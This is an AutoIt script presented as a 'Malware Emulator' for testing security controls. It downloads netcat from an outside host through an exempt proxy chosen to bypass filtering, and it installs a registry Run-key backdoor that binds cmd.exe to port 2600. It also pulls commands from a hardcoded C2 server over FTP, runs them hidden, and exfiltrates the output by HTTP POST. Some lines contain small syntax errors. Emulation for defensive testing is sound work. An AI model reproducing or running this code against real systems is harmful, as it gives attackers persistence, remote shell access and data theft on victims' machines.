
;Malware Emulator
;
;Author:  		Mike Ahrendt
;Description:	Perform common malware tasks.  Requires a secondary server for FTP transfer and netcat traffic.
;				Created for the testing of Security Controls.
;Version 0.1	-	10/2015
;
;Roadmap for v.2:	Add Schedules Task for backup persistence
;					C2 Commands from EXIF Data
;==========================================================================================================




#include <InetConstants.au3>				;Include statements are pulled into the script and are not built in AutoIt Functions.  They add additional features for easier implementation.
#include <WinAPIFiles.au3>
#include <FTPEx.au3>


;Download Netcat to create a persistent back door on system
;==========================================================================================================

$nc = "C:\Windows\nc.exe"																															;Set variable for location to save NetCat

HttpSetProxy(2, "dvlxsec01.spectrum-health.org:2323")																								;Set to use the exempt proxy to bypass any possible blocks

HttpSetUserAgent("Super_Man")																														;Set an anomalous User Agent String in the HTTP header

$dl = InetGet("http://gr-issa.org/nc.exe", $nc, $INET_IGNORESSL, $INET_DOWNLOADWAIT) 																;Download Netcat executable

InetClose($dl)																																		;Close the network connection

RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "backdoor", "REG_SZ", "C:\Windows\nc.exe -Ldp 2600 -e cmd.exe")		;Write AutoRun persistence mechanism

Run("C:\Windows\nc.exe -Ldp 2600 -e cmd.exe")																										;Start a backdoor shell as command prompt

FileCopy($nc, @AppDataDir, 1)			;Copy netcat to AppData\Roaming for backup





;Download the settings to perform enumeration on system to send back to Command Center
;==========================================================================================================

$server = "54.69.62.117"																;Define the C2 controller IP in variable

$file = "settings.conf"																	;Define file we wish to download from C2 controller

$open = _FTP_Open("C2")																	;Create a handle to connect to C2 controller

$conn = _FTP_Connect($open, $server, "mal", "malware", "","21")							;Create connection to C2 controller

$get = _FTP_FileGet($conn, "/home/mal/" & $file, "C:\Windows\settings.conf")			;Download the Settings INI

;==== Alternative Code for reading file settings.
;$read = _FTP_FileOpen($conn, $file)													;Open the file for reading
;$settings = _FTP_FileRead($read, 105)													;Read the settings file from the FTP site and store binary data into variable
;$settings = BinaryToString($settings)													;Convert the settings binary data into a easier readable string and replace variable





;Read file and perform enumeration
;==========================================================================================================

$out = "C:\Windows\exfil.txt"													;Declare a variable for the location of data we wish to exfiltrate

$conf = FileOpen($file)															;Create a file handle for the configuration file we downloaded from our FTP server

$ini = FileReadToArray($conf)													;Create an array - Each line will be a point in the array

For $i = 0 to UBound ($ini) - 1													;Start loop starting at 0 and ending at the line of our configuration file
   FileWriteLine($out, @CRLF & ">>>> " & $ini[$i] & @CRLF & @CRLF)				;Put in place to segment our exfiltration data to be easier to read
   RunWait("cmd.exe /c " & $ini[$i] & " > " $out, "", @SW_HIDE)					;Execute the commands put in place from our configuration file - @SW_HIDE will launch cmd as a background process
Next





;Exfiltrate Data using HTTP POST methodologies
;==========================================================================================================

$tst = FileRead($out)																	;Read the data we just created with our enumeration script

$str = _URLEncode($tst)																	;Use the URL Encoding function below to encode the data for proper parsing by the PHP script on the server side

$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")										;Utilize internal WinHttp function via an object Call

$oHTTP.Open("POST", "http://54.69.62.117/b.php", FALSE)									;Start an HTTP connection to malicious server - Specify POST verb

$oHttp.SetProxy(2,"dvlxsec01.spectrum-health.org:2323")									;Bypass web filtering by going through exempt proxy -- required for external connection

$oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")			;Specify content-type http header - This will be used for the PHP to know what to parse

$oHTTP.Send("ruler=" & $str)															;This is the data we're sending to the malicious server.  "ruler=" is the input variable declared in the PHP parse in the backend and $str is the encoded exfil data





;==========================================================================================================
;Internal Functions
;
;Functions used in execution of script
;==========================================================================================================


Func _URLEncode($str)
	If IsBool($str) Then Return $str
	Local $a = StringToASCIIArray($str, Default, Default, 2)
	Local $o
	For $i = 0 To UBound($a) - 1
		Switch $a[$i]
			Case 45, 46, 48 To 57, 65 To 90, 95, 97 To 122, 126
				$o &= Chr($a[$i])
			Case 32
				$ot &= "+"
			Case Else
				$o &= "%" & Hex($a[$i], 2)
		EndSwitch
	Next
	Return $o
EndFunc
